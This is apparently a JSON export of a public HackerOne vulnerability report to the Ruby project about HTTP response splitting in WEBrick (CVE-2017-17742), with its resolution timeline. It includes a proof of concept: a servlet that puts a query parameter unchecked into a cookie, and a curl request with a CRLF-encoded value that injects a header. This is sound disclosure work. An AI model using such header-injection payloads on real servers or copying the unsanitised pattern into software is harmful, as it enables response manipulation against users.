{"id":153794,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTM3OTQ=","url":"https://hackerone.com/reports/153794","title":"Response splitting vulnerability in WEBrick","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-07-25T20:33:08.163Z","submitted_at":"2016-07-25T20:33:08.163Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tenderlove","url":"/tenderlove","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7724,"url":"https://hackerone.com/ruby","handle":"ruby","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ruby","twitter_handle":"","website":"https://www.ruby-lang.org","about":"A Programmer's Best Friend"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2017-17742"],"singular_disclosure_disabled":false,"disclosed_at":"2018-04-29T02:01:36.166Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-03-30T02:01:29.587Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nWEBrick seems to be vulnerable to a [response splitting attack](https://www.owasp.org/index.php/HTTP_Response_Splitting).  The reproduction script is very similar to the code shown on the owasp page:\n\n```ruby\nrequire 'webrick'\n\nclass MyServlet \u003c ::WEBrick::HTTPServlet::AbstractServlet\n  def service req, res\n    res.cookies \u003c\u003c WEBrick::Cookie.new('author', req.query['author'])\n    res.body = 'hello world'\n  end\nend\n\nserver = ::WEBrick::HTTPServer.new Port: 8080\nserver.mount \"/\", MyServlet\ntrap('INT') { server.shutdown }\nserver.start\n```\n\nFrom the command line do:\n\n```\n$ curl -i localhost:8080/?author=Aaron%0D%0AX-Foo:%20hacked\n```\n\nThe response looks like this:\n\n```\nHTTP/1.1 200 OK \nServer: WEBrick/1.3.1 (Ruby/2.4.0/2016-07-12)\nDate: Mon, 25 Jul 2016 19:13:18 GMT\nContent-Length: 11\nConnection: Keep-Alive\nSet-Cookie: author=Aaron\nX-Foo: hacked\n\nhello world\n```\n\nYou can see the header has been injected.  I've attached a patch to fix the issue.\n\nNote:  It seems like many Ruby webservers are vulnerable to this attack.  So we may need to coordinate release.","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eWEBrick seems to be vulnerable to a \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FHTTP_Response_Splitting\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eresponse splitting attack\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.  The reproduction script is very similar to the code shown on the owasp page:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;webrick\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eMyServlet\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eWEBrick\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eHTTPServlet\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eAbstractServlet\u003c/span\u003e\n  \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eservice\u003c/span\u003e \u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eres\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ecookies\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"no\"\u003eWEBrick\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;author\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003equery\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;author\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ebody\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;hello world\u0026#39;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eserver\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eWEBrick\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eHTTPServer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e \u003cspan class=\"no\"\u003ePort\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"mi\"\u003e8080\u003c/span\u003e\n\u003cspan class=\"n\"\u003eserver\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003emount\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"no\"\u003eMyServlet\u003c/span\u003e\n\u003cspan class=\"nb\"\u003etrap\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;INT\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"n\"\u003eserver\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eshutdown\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"n\"\u003eserver\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003estart\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFrom the command line do:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ curl -i localhost:8080/?author=Aaron%0D%0AX-Foo:%20hacked\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe response looks like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK \nServer: WEBrick/1.3.1 (Ruby/2.4.0/2016-07-12)\nDate: Mon, 25 Jul 2016 19:13:18 GMT\nContent-Length: 11\nConnection: Keep-Alive\nSet-Cookie: author=Aaron\nX-Foo: hacked\n\nhello world\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou can see the header has been injected.  I\u0026#39;ve attached a patch to fix the issue.\u003c/p\u003e\n\n\u003cp\u003eNote:  It seems like many Ruby webservers are vulnerable to this attack.  So we may need to coordinate release.\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":107282,"file_name":"fix_response_splitting.patch","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/107/282/81e6c98e0857ca41437125d446568c48e8db4ad4/fix_response_splitting.patch?response-content-disposition=attachment%3B%20filename%3D%22fix_response_splitting.patch%22%3B%20filename%2A%3DUTF-8%27%27fix_response_splitting.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3BIZ4JTU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T043427Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCqQsLMvYqK8Fn0GTGiLsXz5M8tY4soJZygdoXv5QEQAIgCyKzbKJdYVXE7%2F2vaqKKjTCLEh%2Fh%2BJKa%2B0XuR0hsEFUqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDLR6kgVshwHIKyeb6iqRA2MFJpPkZrhx3t6AejIGud%2FxGIWTN2PoGCZioXicg1VZZgMq5uaPSAxNNXocaSomclyhf%2B4rJe2NLnNAFrXhEGbulvXBmkmO3c%2BD1qqEXyp6qcE41xoYCshBNytJdSH%2BZLTkpaCox4H3NJ6CH%2Bfflh7STpyLJOhPOuoFBY2ARN4mLdeBNYSs61C8zzgM1WQDBhFMxgMb7vKIJ1dmuPynnD4cKxw%2FWKOaq4NfJudL5XP2lTarTb4xTPf3vkoagtHONFoVfop3fmgabccyD5073szNTxXapdwAVZzs9R7zo8NryIyGlYETmxKma4s0cUHjxtmLxK48pLT0PIi7RZmyxoES3J9QTPpynp9iBtI5QalJxwB2tncxj9MMn9FCqJ1bzmYGaodAVxgE3jvslHp5jSM%2Fa1ljSf8SmNJrP91wkWRf4uVZMFej6WQDf8glru%2BoEB1%2FYut3mcF783rDVabhOcofZMw%2BHz6ACFg0WnuWtpGqDpIcX0PQQ%2FoYL%2BmsAiBEElGWlx6CHhWkYkEEJRUVb4ZXMK38qf8FOusBe7etUydbe6JZ8fKykaXtOPxCu8iTA%2FElzyhp13PbtTDj33DNPynSKOmKukTuY24fr3DCAPr5hsRSqBR1%2Ba8d9PI2IvIU4Avj2sJzGWzPQZqC0yDuDhW7b1Hlw1obEAxs3X5bDEbon1OT%2FNhVXLOjpX6Tgp0e%2FX9uw%2FNELi9ZDp%2F4R20Hnj3eXjNGpomDVtKhE43xUUHq1cwYK5VNgPoPIFeCXGybJOtMWcGWoFDEfI0CPBvkCnoRsX0aaemkRB8e4CYE0aYJNO%2BizSsaZzOxO9oeciDAN9toV%2BloBz7WYCb61lChRw6E6vCQyg%3D%3D\u0026X-Amz-Signature=ee14263dbb81448ed47ef7790ae4ea0ce5452ca36776efebb9c83c03857f95ce","file_size":2641,"type":"text/x-diff"}],"allow_singular_disclosure_at":"2018-04-29T02:01:29.675Z","allow_singular_disclosure_after":-84249178.21928379,"singular_disclosure_allowed":true,"vote_count":4,"voters":["bl4de","akaash_pantherdefence","eveeez","geeknik"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2233375,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-19T01:25:20.066Z","updated_at":"2017-12-19T01:25:20.066Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":102823},"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2233377,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-19T01:25:28.424Z","updated_at":"2017-12-19T01:25:28.424Z","cve_ids":["CVE-2017-17742"],"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2465517,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-06T22:08:00.043Z","updated_at":"2018-03-06T22:08:00.043Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tenderlove","url":"/tenderlove"},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2467684,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-07T07:41:38.610Z","updated_at":"2018-03-07T07:41:38.610Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2467685,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tenderlove This vulnerability is not fixed yet.","markdown_message":"\u003cp\u003e\u003ca href=\"/tenderlove\"\u003e@tenderlove\u003c/a\u003e This vulnerability is not fixed yet.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-07T07:42:09.506Z","updated_at":"2018-03-07T07:42:09.506Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2467687,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-07T07:43:54.565Z","updated_at":"2018-03-07T07:43:54.565Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2542437,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We fixed this report with Ruby 2.2.10, 2.3.7, 2.4.4, 2.5.1","markdown_message":"\u003cp\u003eWe fixed this report with Ruby 2.2.10, 2.3.7, 2.4.4, 2.5.1\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-29T01:46:16.307Z","updated_at":"2018-03-29T01:46:16.307Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tenderlove","url":"/tenderlove"},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2542438,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"The reporter was this project member.","markdown_message":"\u003cp\u003eThe reporter was this project member.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-29T01:46:57.219Z","updated_at":"2018-03-29T01:46:57.219Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby"}},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2545865,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-30T02:01:29.624Z","updated_at":"2018-03-30T02:01:29.624Z","first_to_agree":true,"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2676879,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-29T02:01:36.186Z","updated_at":"2018-04-29T02:01:36.186Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby"}},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}